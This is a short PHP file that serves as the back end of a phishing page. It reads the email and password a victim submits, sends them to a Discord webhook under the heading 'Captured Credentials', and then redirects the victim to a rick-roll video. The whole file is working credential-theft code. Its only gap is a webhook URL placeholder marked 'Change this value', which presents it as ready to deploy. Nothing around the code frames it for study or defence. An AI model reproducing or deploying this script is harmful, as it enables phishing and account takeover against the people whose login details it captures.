<?php
// Display error message.
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST['email'];
  $pass = $_POST['password'];

  // Discord webhook url.
  $webhook_url = "https://discord.com/api/webhooks/---------"; // Change this value.

  // Send credentials to discord.
  $data = [
    "content" => "**Captured Credentials**\nEmail: `$email`\nPassword: `$pass`"
  ];

  $json_data = json_encode($data);

  $ch = curl_init($webhook_url);
  curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  curl_exec($ch);
  curl_close($ch);

  // Rick roll for fun.
  header("Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  exit;
}
?>
